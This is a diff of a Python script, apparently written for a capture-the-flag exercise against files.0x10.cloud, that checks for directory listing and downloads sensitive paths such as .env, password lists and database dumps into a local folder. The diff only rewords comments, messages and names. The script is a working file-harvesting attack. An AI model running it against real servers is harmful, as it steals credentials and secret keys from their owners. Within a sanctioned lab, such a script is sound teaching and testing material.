@@ -1,15 +1,16 @@
 # ============================================================
-#  Vulnerability: Open Directory Listing + Sensitive File Exposure
+#  Vulnerability: Unprotected Files - Open Directory Listing + Sensitive File Exposure
 #  Target: files.0x10.cloud
 #  Author: Luke
 # ============================================================
 #
-#  When directory listing is enabled, anyone can browse the file server
-#  and download sensitive files such as .env, database backups, and
-#  password lists without any authentication.
+#  The file server at files.0x10.cloud has directory listing enabled.
+#  This allows anyone to browse and download sensitive files such as:
+#  - .env files containing database passwords and secret keys
+#  - Database backups (.sql dumps)
+#  - Password lists and configuration files
 #
-#  This is a critical security issue because it exposes credentials,
-#  secret keys, and potentially the CTF flag.
+#  This is a critical information disclosure vulnerability.
 # ============================================================
 
 import requests
@@ -18,8 +19,8 @@ from urllib.parse import urljoin
 
 BASE_URL = "https://files.0x10.cloud/"
 
-# Sensitive files that are commonly exposed when directory listing is enabled
-TARGET_FILES = [
+# List of sensitive files that should not be publicly accessible
+SENSITIVE_FILES = [
     ".env",
     "secret/passwords.txt",
     "backup/db_dump.sql",
@@ -28,50 +29,54 @@ TARGET_FILES = [
     "passwords.txt"
 ]
 
-print("=" * 60)
-print("  Open Directory Listing + Sensitive File Exposure")
-print("=" * 60)
+print("=" * 65)
+print("  Unprotected Files - Open Directory Listing & Sensitive File Exposure")
+print("=" * 65)
 print(f"  Target: {BASE_URL}\n")
 
-# Check if root directory listing is enabled
+# Check if directory listing is enabled on the root
 try:
     response = requests.get(BASE_URL, timeout=8)
     if response.status_code == 200 and ("Index of" in response.text or "<a href=" in response.text):
-        print("[+] Directory listing is ENABLED on the root folder.")
-        print("    Anyone can browse and download files without login.\n")
+        print("[+] CRITICAL: Directory listing is ENABLED!")
+        print("    Anyone can view and download files without authentication.\n")
     else:
-        print("[-] Root listing not visible, but testing direct file access...\n")
+        print("[-] Root directory listing not obviously enabled, testing direct file access...\n")
 except Exception as e:
-    print(f"[!] Error checking root: {e}\n")
+    print(f"[!] Error checking root directory: {e}\n")
 
-# Try to download sensitive files
 print("Attempting to access sensitive files...\n")
-downloaded = 0
+downloaded_count = 0
 
-for file_path in TARGET_FILES:
+for file_path in SENSITIVE_FILES:
     full_url = urljoin(BASE_URL, file_path)
-    save_name = file_path.replace("/", "_")
-    save_path = f"exposed_files/{save_name}"
-
+    
     try:
         response = requests.get(full_url, timeout=10)
+        
         if response.status_code == 200 and len(response.content) > 100:
+            # Save the downloaded file
             os.makedirs("exposed_files", exist_ok=True)
+            safe_name = file_path.replace("/", "_")
+            save_path = f"exposed_files/{safe_name}"
+            
             with open(save_path, "wb") as f:
                 f.write(response.content)
             
-            print(f"[+] SUCCESS: Downloaded {full_url}")
-            print(f"    Saved as: {save_path} ({len(response.content):,} bytes)")
-            downloaded += 1
-
-            if ".env" in file_path:
-                print("    → .env file contains database credentials and secret keys!")
+            print(f"[+] SUCCESS: Downloaded → {full_url}")
+            print(f"    Saved to: {save_path}  ({len(response.content):,} bytes)")
+            
+            if ".env" in file_path.lower():
+                print("    → .env file leaked! Contains credentials and secret keys.")
+            
+            downloaded_count += 1
         else:
-            print(f"[-] Not found or empty: {full_url}")
+            print(f"[-] Not accessible: {full_url} (Status: {response.status_code})")
+            
     except Exception as e:
         print(f"[-] Error accessing {full_url}: {e}")
 
-print("\n" + "=" * 60)
-print(f"Scan completed! {downloaded} sensitive file(s) were successfully downloaded.")
-print("Check the 'exposed_files' folder for credentials and flags.")
-print("This demonstrates a critical information disclosure vulnerability.")
+print("\n" + "=" * 65)
+print(f"Scan completed! {downloaded_count} sensitive file(s) successfully downloaded.")
+print("Check the 'exposed_files' folder for leaked credentials and the CTF flag.")
+print("This demonstrates a serious unprotected files vulnerability.")
